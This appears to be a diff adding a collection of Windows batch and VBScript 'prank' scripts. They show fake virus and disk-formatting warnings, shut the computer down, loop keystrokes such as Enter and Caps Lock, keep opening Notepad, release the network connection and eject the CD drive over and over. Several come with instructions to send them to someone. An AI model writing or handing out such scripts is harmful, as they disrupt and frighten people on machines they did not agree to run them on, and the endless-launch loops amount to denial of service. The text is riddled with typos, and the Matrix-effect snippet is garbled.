@@ -1,0 +1,93 @@
+##-Convey your frined a message and shutdown his computer:
+@echo off
+msg * i dont like you
+shutdown -c "Error!You are too silly!" -s
+save as .bat
+-----------------------
+
+##-show message box simultaneosly:
+@echo off
+msg * Warning your computer has detected a virus.
+msg * To remove the virus click ok or close this box
+msg * Your hard drive are now being formatted 
+msg * please wait..........
+msg * * you are hacked...
+save it as .bat
+--------------------------
+
+##-continusly type a message
+Set wshShell = wscript.CreateObject("WScript.Shell")
+do
+wscript.sleep 100
+wshshell.sendkeys "Hello Dear. Look I am a virus."
+loop
+Save TypingVirus.vbs
+--------------------------
+
+##-Matrix falling code effect
+@echo off
+color 02
+:tricks
+echo
+%random%%random%%random%%random
+%%random%%random%%random%%rando
+m%
+goto tricks
+svae Matrix.bat
+--------------------------
+
+##-toggle your frind's caps lock button simultaneously:
+Set wshShell
+=wscript.CreateObject(“WScript.Shell”)
+do
+wscript.sleep 100
+wshshell.sendkeys "{CAPSLOCK}"
+loop
+
+Save it as "Anything.VBS" and send it.
+---------------------------
+##-open noot book loop
+@ECHO off
+:top
+START %SystemRoot%\system32\notepad.exe
+GOTO top
+
+3. Save it as "Anything.BAT" and send it.
+------------------------------
+
+##-stop some one internet
+@Echo off
+Ipconfig /release
+
+Save that as a .bat and send it to someone. They're
+IP address will be lost, and therefore they won't be
+able to fix it
+
+However, this is VERY easy to fix. Simply type in
+IPconfig /renew
+------------------------------
+
+##-hit enter sim vbs script
+Set wshShell = wscript.CreateObject("WScript.Shell")
+do
+wscript.sleep 100
+wshshell.sendkeys "~(enter)"
+loop
+
+Save it as "Anything.VBS" and send it.
+-------------------------------
+##-cd open loop
+Set oWMP = CreateObject("WMPlayer.OCX.7")
+Set colCDROMs = oWMP.cdromCollection
+do
+if colCDROMs.Count >= 1 then
+For i = 0 to colCDROMs.Count - 1
+colCDROMs.Item(i).Eject
+Next
+For i = 0 to colCDROMs.Count - 1
+colCDROMs.Item(i).Eject
+Next
+End If
+wscript.sleep 5000
+loop
+Save it as abc.vbs
